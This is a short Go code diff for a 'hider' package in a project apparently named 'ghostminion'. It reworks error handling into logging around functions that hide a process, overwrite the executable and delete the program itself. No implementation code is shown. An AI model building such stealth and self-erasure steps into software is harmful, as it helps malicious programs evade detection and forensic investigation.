@@ -1,25 +1,27 @@
 package hider
 
 import (
-	"fmt"
+	"ghostminion/logger"
 	"os"
 	"strconv"
 )
 
-func Hide() error {
+var lgr = logger.GetLogger()
+
+func Hide() {
+	lgr.Debug("Hiding process begins")
 	err := hideProcess()
 	if err != nil {
-		return fmt.Errorf("error hiding process: %v", err)
+		lgr.Error("Error hiding process:", err.Error())
 	}
 	err = overwriteExecutable()
 	if err != nil {
-		return fmt.Errorf("error overwriting executable: %v", err)
+		lgr.Error("Error overwriting executable:", err.Error())
 	}
 	err = deleteSelf()
 	if err != nil {
-		return fmt.Errorf("error deleting self: %v", err)
+		lgr.Error("Error deleting self:", err.Error())
 	}
-	return nil
 }
 
 func hideProcess() error {
